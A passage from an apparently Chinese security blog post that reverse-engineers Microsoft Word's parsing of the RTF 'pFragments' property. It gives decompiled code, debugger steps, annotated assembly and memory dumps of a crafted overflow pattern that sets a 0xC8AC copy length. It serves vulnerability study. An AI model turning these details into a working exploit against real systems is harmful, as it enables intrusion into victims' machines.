class="comment">// 分配内存</span></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    mem_lock_ptr = (<span class="keyword">char</span> *)GlobalLock(mem_ptr);</span><br><span class="line">    pMem = mem_lock_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    <span class="comment">// rtf中数据是以16进制形式存储的，这里将16进制数据转化为字符</span></span><br><span class="line">    <span class="comment">// 如：3431 3631 -&gt; 41 61</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">        *mem_lock_ptr = <span class="number">0</span>;</span><br><span class="line">        chr_hex = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'0'</span> &amp;&amp; chr_hex &lt;= <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            chr = chr_hex - <span class="string">'0'</span>;</span><br><span class="line">LABEL_36:</span><br><span class="line">            *mem_lock_ptr = chr;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex &lt;= <span class="string">'f'</span> )     <span class="comment">// 字母小写转大写</span></span><br><span class="line">        &#123;</span><br><span class="line">            chr = (chr_hex | <span class="string">' '</span>) - <span class="number">87</span>;             <span class="comment">// 'a'-&gt;A(int)</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_37:</span><br><span class="line">        *mem_lock_ptr *= <span class="number">16</span>;        <span class="comment">// 左移4位</span></span><br><span class="line">        new_char = *mem_lock_ptr;   <span class="comment">// 当前字符作为16进制高4位字符</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            ++index;</span><br><span class="line">        <span class="keyword">while</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> &amp;&amp; index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">        chr_hex1 = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex1 &lt; <span class="string">'0'</span> || chr_hex1 &gt; <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( chr_hex1 &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex1 &lt;= <span class="string">'f'</span> )               <span class="comment">// 字母小写转大写</span></span><br><span class="line">                *mem_lock_ptr = new_char + (chr_hex1 | <span class="string">' '</span>) - <span class="number">87</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *mem_lock_ptr = chr_hex1 + new_char - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++mem_lock_ptr;</span><br><span class="line">LABEL_44:</span><br><span class="line">        ++index;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">    v39 = group_part_ptr1;</span><br><span class="line">LABEL_46:</span><br><span class="line">    v17 = GlobalHandle(pMem);                     <span class="comment">// 与GlobalLock作用相反</span></span><br><span class="line">    CreateStreamOnHGlobal(v17, <span class="number">1</span>, &amp;el_count);</span><br><span class="line">    (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, LPSTREAM))(*key_object + <span class="number">0x38</span>))(key_object, el_count);</span><br><span class="line">    el_count-&gt;lpVtbl-&gt;Release(el_count);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过对<code>sub_31FD724E</code>函数的伪代码分析可知，Word在解析完<code>“pFragments”</code>属性值数组参数<code>el_size</code>后，会利用一个<code>switch-case</code>语句对<code>el_size</code>的值进行判断，如果为<code>2,4,8</code>会进行额外处理，<code>非2,4,8</code>则默认不会处理。而如果为<code>0</code>的话，会在<code>MSO_379</code>-&gt;<code>MSO_501</code>-&gt;<code>sub_32608E17</code>-&gt;<code>sub_32608E81</code>中的<code>&quot;32608EAE div ecx&quot;</code>处出错，<code>el_size</code>被当做”div ecx”中的<code>除数</code>(ecx)，造成<code>除数为0</code>的错误。</p>
<p>&emsp;&emsp;继续往下执行，Word会对<code>“pFragments”</code>属性值<code>数组参数</code>后面的数据进行处理。在<code>RTF</code>中，字符<code>“A”</code>是以其16进制值<code>“41”</code>的16进制值<code>“3431”</code>进行存储的，所以<code>Word</code>会对<code>RTF</code>文档中的数据进行一次转化，<code>转化过程</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">023A0004  31 31 31 31 31 31 31 31 61 63 63 38 34 31 36 31  11111111acc84161</span><br><span class="line">023A0014  33 30 34 31 36 31 33 31 34 31 36 31 33 32 34 31  3041613141613241</span><br><span class="line">023A0024  36 31 33 33 34 31 36 31 33 34 34 31 36 31 33 35  6133416134416135</span><br><span class="line">023A0034  34 31 36 31 33 36 34 31 36 31 33 37 34 31 36 31  4161364161374161</span><br><span class="line">023A0044  33 38 34 31 36 31 33 39 34 31 36 32 33 30 34 31  3841613941623041</span><br><span class="line">023A0054  36 32 33 31 34 31 36 32 33 32 34 31 36 32 33 33  6231416232416233</span><br><span class="line">023A0064  34 31 36 32 33 34 34 31 36 32 33 35 34 31 36 32  4162344162354162</span><br><span class="line">023A0074  33 36 34 31 36 32 33 37 34 31 36 32 33 38 34 31  3641623741623841</span><br><span class="line">023A0084  36 32 33 39 34 31 36 33 33 30 34 31 36 33 33 31  6239416330416331</span><br><span class="line">023A0094  34 31 36 33 33 32 34 31 36 33 33 33 34 31 36 33  4163324163334163</span><br><span class="line">023A00A4  33 34 34 31 36 33 33 35 34 31 36 33 33 36 34 31  3441633541633641</span><br><span class="line">023A00B4  36 33 33 37 34 31 36 33 33 38 34 31 36 33 33 39  6337416338416339</span><br><span class="line">        |       |                                   |       |</span><br><span class="line">        ↓       ↓                                   ↓       ↓</span><br><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">003AFF68  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span><br><span class="line">003AFF78  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span><br><span class="line">003AFF88  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span><br><span class="line">003AFF98  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span><br><span class="line">003AFFA8  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span><br><span class="line">003AFFB8  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span><br><span class="line">003AFFC8  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span><br><span class="line">003AFFD8  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span><br><span class="line">003AFFE8  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span><br><span class="line">003AFFF8  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span><br><span class="line">003B0008  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span><br><span class="line">003B0018  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;经过测试<code>“pFragments”</code>属性值数组参数中的<code>el_size</code>可以是除了<code>“0,2,4,8”</code>之外的任何<code>10进制正整数</code>，如果为<code>“0,2,4,8”</code>中的任意一个，都会造成<code>Word奔溃</code>。而<code>el_count</code>则无限制，任何<code>10进制整数</code>都可以，<code>负的</code>也行。</p>
<h3 id="0x34-pFragments属性数据中“11111111acc8”的含义"><a href="#0x34-pFragments属性数据中“11111111acc8”的含义" class="headerlink" title="0x34 pFragments属性数据中“11111111acc8”的含义"></a>0x34 pFragments属性数据中“11111111acc8”的含义</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p>
<p>&emsp;&emsp;前面我们已经知道<code>“11111111acc8”</code>中的<code>“acc8”</code>为Word将<code>pFragments属性数据</code>复制到<code>栈</code>上的<code>数据长度</code>，可是为什么要<code>偏移8字节</code>呢，这8字节有什么<code>限制</code>吗？这些都是要搞清楚的。</p>
<p>&emsp;&emsp;从前面<code>对奔溃原因溯源</code>的调试中可以知道，复制数据长度<code>“0xc8ac”</code>是从<code>关键对象</code>(0x066a55e0)的<code>成员变量</code>中取出的，所以，我们知道对其下<code>内存写断点</code>，就可以断在<code>对此成员变量赋值</code>的位置，也就是对<code>“11111111acc8”</code>进行解析的代码处。</p>
<p><strong><code>找关键位置所用方法：</code></strong></p>
<blockquote>
<ul>
<li>1、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>第4个dword</code>下<code>内存写断点</code>(<code>0x066a55ec</code>为复制长度<code>0xc8ac</code>所在对象成员变量的内存地址)。</li>
<li>2、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li>
<li>3、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时注意OllyDbg的信息窗口中的信息，是否是对关键对象<code>0x066a55e0</code>的<code>第4个dword</code>赋值复制数据长度“0xc8ac”，如果是，则已经定位到解析<code>“11111111acc8”</code>的代码处。</li>
<li>4、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;如此，我们已经找到解析<code>“11111111acc8”</code>的代码片段。<code>“acc8”</code>偏移<code>8字节</code>的原因以及<code>这8字节</code>是否有什么<code>限制</code>的代码应该就在附近，我们对找到的代码片段<code>详细分析</code>，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>319C0631 loc_319C0631:                           <span class="comment">; CODE XREF: sub_31FD724E-616C6D↑j</span></span><br><span class="line"><span class="symbol">.text:</span>319C0631                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+el_count]                  <span class="comment">;   eax = ebp-0x4 = 0x0011B268-0x4 = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0634                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; ppstm              ; arg3: eax = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0635                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; fDeleteOnRelease   ; arg2: 1</span></span><br><span class="line"><span class="symbol">.text:</span>319C0637                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+pMem]      <span class="comment">; pMem               ; arg1: [ebp-0x1c] = [0x0011B268-0x1c] = [0x0011B24c] = 0x0026FAD8</span></span><br><span class="line">            <span class="comment">; 0026FAD8  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span></span><br><span class="line">            <span class="comment">; 0026FAE8  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span></span><br><span class="line">            <span class="comment">; 0026FAF8  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span></span><br><span class="line">            <span class="comment">; 0026FB08  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span></span><br><span class="line">            <span class="comment">; 0026FB18  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span></span><br><span class="line">            <span class="comment">; 0026FB28  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span></span><br><span class="line">            <span class="comment">; 0026FB38  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span></span><br><span class="line">            <span class="comment">; 0026FB48  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span></span><br><span class="line">            <span class="comment">; 0026FB58  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span></span><br><span class="line">            <span class="comment">; 0026FB68  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span></span><br><span class="line">            <span class="comment">; 0026FB78  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span></span><br><span class="line">            <span class="comment">; 0026FB88  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span></span><br><span class="line"><span class="symbol">.text:</span>319C063A                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GlobalHandle                      <span class="comment">; GlobalHandle函数与GlobalLock函数作用相反</span></span><br><span class="line"><span class="symbol">.text:</span>319C0640                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hGlobal            ; arg1: eax = 0x0026FAD8</span></span><br><span class="line"><span class="symbol">.text:</span>319C0641                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateStreamOnHGlobal             <span class="comment">; CreateStreamOnHGlobal函数从指定内存创建流对象</span></span><br><span class="line"><span class="symbol">.text:</span>319C0647                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                     <span class="comment">;   eax = [ebp-0x8] = [0x0011B268-0x8] = [0x0011B260] = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064A                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+el_count]                       <span class="comment">; arg2: [ebp-0x4] = [0x0011B268-0x4] = [0x0011B264] = 0x06454B30(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                           <span class="comment">;   ecx = [eax] = [0x066A55E0] = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064F                 <span class="keyword">push</span>    <span class="built_in">eax</span>                                  <span class="comment">; arg1: eax = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C0650                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">38h</span>]                  <span class="comment">; mso.32E14136</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *********************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_32E14136(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">    *********************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E14136                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14137                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14139                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413A                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413B                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413C                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   ebx = [ebp+0xc] = [0x0011B1F4] = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413F                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14140                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026(pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14141                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   eax = ebp+0xc = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14144                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14145                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14146                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1F4] = 0x06454B30 -&gt; 0x06451111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414B                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414D                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = ebp-0x4 = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14152                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14153                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14154                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E4] = 0x32A0C8C4 -&gt; 0x32A01111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14159                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415B                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = ebp-8 = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14160                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14161                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14162                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E0] = 0x32A0C8C4 -&gt; 0x32A0C8AC &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14167                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14169                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416B                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   ax = [ebp+0xc] = [0x0011B1F4] = 0x1111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416F                 <span class="keyword">cmp</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_4]                  <span class="comment">;   ax = 0x1111,[ebp-0x4] = [0x0011B1E4] = 0x1111 &lt;-----两个word进行比较</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14173                 <span class="keyword">ja</span>      short loc_32E141C5               <span class="comment">;   大于则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14175                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   esi = [ebp+0x8] = [0x0011B1F0] = 0x066A55E0(关键对象首地址)(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14178                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg1: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x066A5618</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1417B                 <span class="keyword">call</span>    _MsoFreePv@<span class="number">4</span>    <span class="comment">; MsoFreePv(x)   ; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E14180                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_8]                  <span class="comment">;   ax = [ebp-0x8] = [0x0011B1E8-0x8] = [0x0011B1E0] = 0xC8AC(复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14184                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>                    <span class="comment">;   [esi+0xc] = [0x066A55E0+0xc] = [0x066A55EC] = ax = 0xC8AC(复制数据长度) &lt;---- 对关键对象成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14188                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = [ebp-0x4] = [0x0011B1E4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418D                 <span class="keyword">push</span>    <span class="number">4</span>                                <span class="comment">; arg2: 0x4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418F                 <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]                     <span class="comment">;   edi = esi+4 = 0x066A55E0+4 = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14192                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; arg1: edi = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14193                 <span class="keyword">call</span>    MSO_501                          <span class="comment">; 对关键对象0x066A55E0中的成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14198                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419A                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419C                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = [0x0011B1E8-0x8] = [0x0011B1E0] = 0x0000C8AC</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A0                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]        <span class="comment">;   ecx = [ebp+0xc] = [0x0011B1F4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A4                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax*ecx = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A7                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A8                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg2: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x1D400000</span></span><br><span class="line"><span class="symbol"> 